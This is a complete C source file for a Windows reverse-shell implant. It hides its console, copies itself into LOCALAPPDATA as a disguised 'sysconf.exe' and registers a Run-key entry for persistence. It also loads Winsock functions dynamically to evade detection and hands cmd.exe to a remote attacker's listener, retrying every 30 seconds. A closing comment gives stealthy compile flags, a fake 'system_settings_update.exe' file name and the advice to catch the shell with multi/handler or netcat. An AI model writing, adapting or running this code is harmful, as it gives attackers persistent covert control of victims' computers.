#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <stdio.h>

#ifndef CLIENT_IP
#define CLIENT_IP "YOUR_IP_HERE"
#endif
#ifndef CLIENT_PORT
#define CLIENT_PORT 4444
#endif

#define RETRY_INTERVAL 30000
#define MAX_RETRIES 0

typedef int(WINAPI *WSA_STARTUP)(WORD, void *);
typedef UINT_PTR(WINAPI *WSA_SOCKET)(int, int, int, void *, unsigned int, unsigned int);
typedef unsigned short(WINAPI *HTONS_FUNC)(unsigned short);
typedef unsigned long(WINAPI *INET_ADDR_FUNC)(const char *);
typedef int(WINAPI *CONNECT_FUNC)(UINT_PTR, const void *, int);
typedef int(WINAPI *CLOSESOCKET_FUNC)(UINT_PTR);
typedef int(WINAPI *WSA_CLEANUP)();

#define AF_INET 2
#define SOCK_STREAM 1
#define IPPROTO_TCP 6
#define INVALID_SOCKET (~0)
#define SOCKET_ERROR (-1)
#define STARTF_USESTDHANDLES 0x00000100

typedef struct
{
    short sin_family;
    unsigned short sin_port;
    union
    {
        struct
        {
            unsigned char s_b1, s_b2, s_b3, s_b4;
        } S_un_b;
        struct
        {
            unsigned short s_w1, s_w2;
        } S_un_w;
        unsigned long S_addr;
    } sin_addr;
    char sin_zero[8];
} SOCKADDR_IN, *PSOCKADDR_IN;

BOOL AttemptConnection(HMODULE ws2_lib, UINT_PTR *pSocket, PSOCKADDR_IN pSa)
{
    WSA_STARTUP pfnWSAStartup = (WSA_STARTUP)GetProcAddress(ws2_lib, "WSAStartup");
    WSA_SOCKET pfnWSASocketA = (WSA_SOCKET)GetProcAddress(ws2_lib, "WSASocketA");
    HTONS_FUNC pfnHtons = (HTONS_FUNC)GetProcAddress(ws2_lib, "htons");
    INET_ADDR_FUNC pfnInetAddr = (INET_ADDR_FUNC)GetProcAddress(ws2_lib, "inet_addr");
    CONNECT_FUNC pfnConnect = (CONNECT_FUNC)GetProcAddress(ws2_lib, "connect");
    CLOSESOCKET_FUNC pfnCloseSocket = (CLOSESOCKET_FUNC)GetProcAddress(ws2_lib, "closesocket");

    if (!pfnWSAStartup || !pfnWSASocketA || !pfnHtons || !pfnInetAddr || !pfnConnect || !pfnCloseSocket)
    {
        return FALSE;
    }

    char wsaDataBuf[400] = {0};
    WORD wVersionRequested = MAKEWORD(2, 2);
    if (pfnWSAStartup(wVersionRequested, wsaDataBuf))
    {
        return FALSE;
    }

    *pSocket = pfnWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
    if (*pSocket == INVALID_SOCKET)
    {
        return FALSE;
    }

    pSa->sin_family = AF_INET;
    pSa->sin_port = pfnHtons(CLIENT_PORT);
    pSa->sin_addr.S_addr = pfnInetAddr(CLIENT_IP);
    memset(pSa->sin_zero, 0, sizeof(pSa->sin_zero));

    Sleep(800 + (GetTickCount() % 500));

    if (pfnConnect(*pSocket, (const void *)pSa, sizeof(*pSa)) == SOCKET_ERROR)
    {
        pfnCloseSocket(*pSocket);
        *pSocket = INVALID_SOCKET;
        return FALSE;
    }

    return TRUE;
}

BOOL CopySelfToSystemLocation(char *outPath, size_t outPathSize)
{
    char selfPath[MAX_PATH];
    char appData[MAX_PATH];

    if (GetModuleFileNameA(NULL, selfPath, MAX_PATH) == 0)
        return FALSE;

    if (GetEnvironmentVariableA("LOCALAPPDATA", appData, MAX_PATH) == 0)
        return FALSE;

    snprintf(outPath, outPathSize, "%s\\Microsoft\\Windows\\SystemSettings\\sysconf.exe", appData);

    char dirPath[MAX_PATH];
    strcpy(dirPath, outPath);

    char *lastSlash = strrchr(dirPath, '\\');
    if (lastSlash)
    {
        *lastSlash = '\0';

        char *p = dirPath;
        while ((p = strchr(p, '\\')) != NULL)
        {
            *p = '\0';
            CreateDirectoryA(dirPath, NULL);
            *p = '\\';
            p++;
        }
        CreateDirectoryA(dirPath, NULL);
    }

    return CopyFileA(selfPath, outPath, FALSE);
}

BOOL IsRunningFromInstalledLocation()
{
    char selfPath[MAX_PATH];
    char appData[MAX_PATH];

    if (GetModuleFileNameA(NULL, selfPath, MAX_PATH) == 0)
        return FALSE;

    if (GetEnvironmentVariableA("LOCALAPPDATA", appData, MAX_PATH) == 0)
        return FALSE;

    return (strstr(selfPath, appData) != NULL);
}

DWORD WINAPI DelayedPayloadThread(LPVOID lpParam)
{
    Sleep(10000);

    HMODULE ws2_lib = LoadLibraryA("ws2_32.dll");
    if (!ws2_lib)
        return 1;

    CLOSESOCKET_FUNC pfnCloseSocket = (CLOSESOCKET_FUNC)GetProcAddress(ws2_lib, "closesocket");
    if (!pfnCloseSocket)
    {
        FreeLibrary(ws2_lib);
        return 1;
    }

    UINT_PTR s = INVALID_SOCKET;
    SOCKADDR_IN sa;

    int retryCount = 0;
    BOOL connected = FALSE;

    while (!connected && (MAX_RETRIES == 0 || retryCount < MAX_RETRIES))
    {
        if (retryCount > 0)
        {
            Sleep(RETRY_INTERVAL);
        }

        connected = AttemptConnection(ws2_lib, &s, &sa);
        retryCount++;

        if (connected)
        {
            STARTUPINFO si = {0};
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESTDHANDLES;
            si.hStdInput = (HANDLE)s;
            si.hStdOutput = (HANDLE)s;
            si.hStdError = (HANDLE)s;

            PROCESS_INFORMATION pi = {0};

            if (CreateProcessA(0, "cmd", 0, 0, 1, CREATE_NO_WINDOW, 0, 0, &si, &pi))
            {
                WaitForSingleObject(pi.hProcess, INFINITE);

                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);

                connected = FALSE;
            }
            else
            {
                connected = FALSE;
            }

            if (s != INVALID_SOCKET)
            {
                pfnCloseSocket(s);
                s = INVALID_SOCKET;
            }
        }

        if (!connected && MAX_RETRIES > 0 && retryCount >= MAX_RETRIES)
        {
            retryCount = 0;
        }
    }

    FreeLibrary(ws2_lib);
    return 0;
}

BOOL SetupPersistence(const char *exePath)
{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return FALSE;

    BOOL result = (RegSetValueExA(hKey, "SystemConfigurationManager", 0, REG_SZ,
                                  (BYTE *)exePath, strlen(exePath) + 1) == ERROR_SUCCESS);

    RegCloseKey(hKey);
    return result;
}

int main()
{
    HWND console = GetConsoleWindow();
    ShowWindow(console, SW_HIDE);

    if (!IsRunningFromInstalledLocation())
    {
        char installedPath[MAX_PATH];

        if (CopySelfToSystemLocation(installedPath, MAX_PATH))
        {
            SetupPersistence(installedPath);

            STARTUPINFOA si = {0};
            PROCESS_INFORMATION pi = {0};
            si.cb = sizeof(si);

            if (CreateProcessA(installedPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
            {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }

            return 0;
        }
    }
    else
    {
        HANDLE hThread = CreateThread(NULL, 0, DelayedPayloadThread, NULL, 0, NULL);
        if (hThread)
        {
            CloseHandle(hThread);
        }

        Sleep(INFINITE);
    }

    return 0;
}

/*
Compile with:
gcc -O3 -s -fno-stack-protector -fno-ident -fno-exceptions -o system_settings_update.exe reconnect_variant.c

Reconnects every 30 seconds if not connected use multi/handler or netcat.
https://www.virustotal.com/gui/file/82b76b3c7c8cae1a34ffee4a1e011b324a2581bea3baa5a683367388d703759f?nocache=1
*/
